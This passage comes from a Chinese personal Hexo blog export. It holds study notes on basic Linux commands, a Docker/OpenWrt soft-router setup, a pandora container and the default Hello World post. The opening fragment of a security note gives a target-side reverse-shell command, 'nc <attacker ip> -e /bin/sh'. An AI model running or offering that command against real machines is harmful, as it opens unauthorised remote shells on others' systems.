端口<br></code></pre></td></tr></table></figure><h4 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h4><p>nc &lt;攻击机ip 端口号&gt; -e &#x2F;bin&#x2F;sh</p><p>-e execute  执行    重定向到shell</p><p>靶机可能没有nc工具,不建议记这个</p><h2 id="wsl问题"><a href="#wsl问题" class="headerlink" title="wsl问题"></a>wsl问题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh winsock reset<br>ssh-keygen -R ip<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OS</title>
    <link href="/2023/08/20/OS/"/>
    <url>/2023/08/20/OS/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="linux-room"><a href="#linux-room" class="headerlink" title="linux room"></a>linux room</h2><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><p>打印</p><h4 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h4><p>展示用户名</p><h4 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h4><p>listing 列表  列出我们当前目录中的文件</p><h4 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h4><p>change directory进入文件     </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">cd</span> tryhackme    <br></code></pre></td></tr></table></figure><h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>concatenate（连接）输出文件的内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.txt <br></code></pre></td></tr></table></figure><h4 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h4><p>print working directory   展示当前文件路径</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find -name filename.<code>*</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> -name 1.txt<br><span class="hljs-built_in">find</span> -name *.txt<br></code></pre></td></tr></table></figure><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p>选定文件根据关键字查找</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">grep</span> <span class="hljs-number">1</span> test1         #<span class="hljs-number">1</span>是要查找的内容，test1是文件名字<br></code></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title="&gt;"></a>&gt;</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">echo hello_world &gt; <span class="hljs-keyword">test</span>          #保存&#x27;hello_world&#x27;到<span class="hljs-keyword">test</span>文件并覆盖<span class="hljs-keyword">test</span>文件的原有内容,如果没有<span class="hljs-keyword">test</span>文件会自动创立一个<br></code></pre></td></tr></table></figure><h4 id="-1"><a href="#-1" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h4><p>只增加不覆盖</p><h4 id="man"><a href="#man" class="headerlink" title="man"></a>man</h4><p>manual page   说明书页面<br><img src="C:/Users/10913/AppData/Roaming/Typora/typora-user-images/image-20230517194601900.png" alt="image-20230517194601900"></p><h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><p>创建文件  touch (filename)</p><h4 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h4><p>创建文件夹  make directory</p><h4 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h4><p>删除操作  remove(移除)<br>rm  (filename)   删除空目录(文件夹)和文件<br>rm -R (filename)  可以删除非空目录</p><h4 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h4><p>move  移动文件夹或者文件<br>mv (filename) (new path)   移动到新地方(相当于剪切)<br>mv (filename) (newname)   重命名操作</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>确定文件类型(后缀)<br>file (filename)</p><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><p><code>ls -l</code>会显示出当前目录的文件&#x2F;文件夹的详细信息<img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230517211358.png"><br><code>-</code>代表普通文件<br>drwxr代表目录<br>rw表示可读(read)可写(write)</p><h3 id="公共目录"><a href="#公共目录" class="headerlink" title="公共目录"></a>公共目录</h3><h4 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h4><p>etcetera(等等)  就是文章里的etc:  补充的意思</p><h4 id="var"><a href="#var" class="headerlink" title="var"></a>var</h4><p>此文件夹存储系统上运行的服务或应用程序经常访问或写入的数据。例如，来自正在运行的服务和应用程序的日志文件写在这里 ( <strong>&#x2F;var&#x2F;log</strong> )，或者其他不一定与特定用户关联的数据（即数据库等）。</p><h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><h4 id="tmp"><a href="#tmp" class="headerlink" title="tmp"></a>tmp</h4><p>temporary 临时的<br>存放临时文件,任何权限都可读写,系统关闭或重启时删除tmp目录内所有内容</p><h3 id="文本编辑器"><a href="#文本编辑器" class="headerlink" title="文本编辑器"></a>文本编辑器</h3><h4 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h4><p>nano (filename)  新建一个文件并用nano编辑器打开<br><code>ctrl O</code>保存,<code>ctrl x</code>退出</p><h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><h3 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h3><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p>wget <code>wget https://fata.taosu0216.cn/file.txt</code><br>需要先在本地打开<code>python3 -m http.server</code>(或者在ssh连接的主机上打开),然后要在下载的地方使用wget命令(这里要open new tab)</p><h4 id="传输文件-SCP"><a href="#传输文件-SCP" class="headerlink" title="传输文件(SCP)"></a>传输文件(SCP)</h4><p>secure copy</p><h4 id="查看进程-ps"><a href="#查看进程-ps" class="headerlink" title="查看进程(ps)"></a>查看进程(ps)</h4><p>process status(进程状态)</p><h4 id="查看实时进程-top"><a href="#查看实时进程-top" class="headerlink" title="查看实时进程(top)"></a>查看实时进程(top)</h4><p>会按顺序排序,按q退出,按k进入对话模式</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pandora</title>
    <link href="/2023/08/20/pandora/"/>
    <url>/2023/08/20/pandora/</url>
    
    <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker pull pengzhile/pandora<br><br>docker <span class="hljs-built_in">run</span>  -e <span class="hljs-attribute">PANDORA_CLOUD</span>=cloud -e <span class="hljs-attribute">PANDORA_SERVER</span>=0.0.0.0:8899 -p 8899:8899 -d pengzhile/pandora<br><br>删除<br>docker stop 580a935ff25a<br>docker rm 580a935ff25a<br>docker rmi pengzhile/pandora<br>docker<span class="hljs-built_in"> system </span>prune -a<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu+docker+op</title>
    <link href="/2023/08/20/Ubuntu-docker-op/"/>
    <url>/2023/08/20/Ubuntu-docker-op/</url>
    
    <content type="html"><![CDATA[<h1 id="利用ubuntu地linux环境模拟迷你主机运行docker跑openwrt镜像-实现软路由-旁路由功能"><a href="#利用ubuntu地linux环境模拟迷你主机运行docker跑openwrt镜像-实现软路由-旁路由功能" class="headerlink" title="利用ubuntu地linux环境模拟迷你主机运行docker跑openwrt镜像,实现软路由&#x2F;旁路由功能"></a>利用ubuntu地linux环境模拟迷你主机运行docker跑openwrt镜像,实现软路由&#x2F;旁路由功能</h1><h2 id="ubuntu启动"><a href="#ubuntu启动" class="headerlink" title="ubuntu启动"></a>ubuntu启动</h2><h3 id="ubuntu系统创建"><a href="#ubuntu系统创建" class="headerlink" title="ubuntu系统创建"></a>ubuntu系统创建</h3><p>经典–&gt;稍后安装操作系统–&gt;linux Ubuntu64位–&gt;自定义硬件</p><h4 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h4><p>显示器取消勾选加速3D图形</p><p>新CD&#x2F;DVD(SATA)选择使用ISO 映像文件 Ubuntu 22的镜像</p><h4 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h4><p>try or install</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230717094853.png"></p><p>中文简体,安装ubuntu,语言chinese chinese,只勾选最小安装</p><p>清楚磁盘,现在安装,继续</p><p>点击中国地图任意一个地方,时区是上海即可</p><p>创建账密</p><p>漫长等待</p><p>重启后按回车</p><h3 id="简单配置"><a href="#简单配置" class="headerlink" title="简单配置"></a>简单配置</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -i   <span class="hljs-regexp">//</span>获得临时root权限<br>sudo passwd root     <span class="hljs-regexp">//</span>设立root用户<br>su root      <span class="hljs-regexp">//</span>切换root用户<br>sudo apt install net-tools        <br><span class="hljs-regexp">//</span>安装网络工具,可以使用ifconfig<br>sudo apt-get install open-vm-tools   <span class="hljs-regexp">//</span>安装vmtools,可以跨虚拟机复制粘贴以及调整屏幕大小(查看--&gt;自动调整大小--&gt;自动适应客户机)<br>reboot         <span class="hljs-regexp">//</span>重启,启用vmtools<br>sudo apt install wcstools         <br>apt install vim<br><span class="hljs-regexp">//</span>安装vim<br></code></pre></td></tr></table></figure><p>软件和更新–&gt;下载自–&gt;其它–&gt;aliyun镜像</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h3 id="各种基础"><a href="#各种基础" class="headerlink" title="各种基础"></a>各种基础</h3><p>更新<code>sudo apt-get update</code></p><p>允许apt安装</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sudo apt-get install <span class="hljs-string">\</span><br>apt-transport-https <span class="hljs-string">\</span><br>ca-certificates <span class="hljs-string">\</span><br>curl <span class="hljs-string">\</span><br>gnupg-agent <span class="hljs-string">\</span><br>software-properties-common<br></code></pre></td></tr></table></figure><p>或者这样也可以<code>apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</code></p><p>添加docker的gpg key</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/ubuntu/g</span>pg | apt-key add -<br></code></pre></td></tr></table></figure><p>验证key指纹</p><p><code>sudo apt-key fingerprint 0EBFCD88</code></p><p>(忽视各种warning)</p><p>添加稳定版仓库</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">sudo<span class="hljs-built_in"> add-apt-repository </span>\<br><span class="hljs-string">&quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \</span><br><span class="hljs-string">$(lsb_release -cs) \</span><br><span class="hljs-string">stable&quot;</span><br></code></pre></td></tr></table></figure><p>在更新一次</p><p><code>sudo apt-get update</code></p><p>安装ce和容器</p><p><code>sudo apt-get install docker-ce docker-ce-cli containerd.io</code></p><p>验证一下</p><p><code>docker --version</code></p><p>安装docker-compose</p><p><code>apt  install docker-compose</code></p><p>验证一下</p><p><code>docker-compose --version</code></p><h3 id="openwrt"><a href="#openwrt" class="headerlink" title="openwrt"></a>openwrt</h3><p>uname-a查看自己的版本信息,选择对应的openwrt的镜像安装</p><p>github仓库</p><p><code>https://github.com/SuLingGG/OpenWrt-Docker</code></p><p>我的是x86_64,amd,选择安装<code>sulinggg/openwrt:x86_64</code></p><p><code>docker pull sulinggg/openwrt:armv7</code></p><p><code>ifconfig</code></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230717105354.png"></p><p>docker0下面的ens33就是网卡名称</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso">ip <span class="hljs-keyword">link</span> <span class="hljs-built_in">set</span> ens33 promisc <span class="hljs-keyword">on</span><br>vim /etc/rc.<span class="hljs-built_in">local</span><br>ip <span class="hljs-keyword">link</span> <span class="hljs-built_in">set</span> ens33 promisc <span class="hljs-keyword">on</span><br></code></pre></td></tr></table></figure><p>创建docker虚拟网络</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker<span class="hljs-built_in"> network </span>create -d macvlan <span class="hljs-attribute">--subnet</span>=192.168.3.0/24 <span class="hljs-attribute">--gateway</span>=192.168.3.1 -o <span class="hljs-attribute">parent</span>=eth0 macnet<br></code></pre></td></tr></table></figure><p>运行容器</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker run <span class="hljs-params">--restart</span> no -d <span class="hljs-params">--name=OpenWRT</span> <span class="hljs-params">--network</span> macnet <span class="hljs-params">--privileged</span> jyhking/onecloud<span class="hljs-function">:1.1</span> <span class="hljs-string">/sbin/init</span><br></code></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it OpenWRT <span class="hljs-regexp">/bin/</span>sh<br>vim <span class="hljs-regexp">/etc/</span>config/network<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230717162259.png"></p><h2 id="防止卡死"><a href="#防止卡死" class="headerlink" title="防止卡死"></a>防止卡死</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker stop &lt;&gt;<br>docker system prune --all --volumes --force<br>netsh winsock reset<br><br>docker pull xuanaimai/onecloud:21-09-15<br>docker run -itd --name=open --restart=always --network=macnet --privileged=<span class="hljs-literal">true</span> xuanaimai/onecloud:21-09-15 /sbin/init<br>docker <span class="hljs-built_in">exec</span> -it open bash<br>//shell clash安装<br><span class="hljs-built_in">export</span> url=<span class="hljs-string">&#x27;https://fastly.jsdelivr.net/gh/juewuy/ShellClash@master&#x27;</span> &amp;&amp; sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -kfsSl $url/install.sh)</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">source</span> /etc/profile &amp;&gt; /dev/null<br><br>6053537/portainer:linux-arm<br><br>docker save -o xiaoya_alist_latest.tar xiaoyaliu/alist:latest<br>//在C://user下<br>9999端口<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/20/hello-world/"/>
    <url>/2023/08/20/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
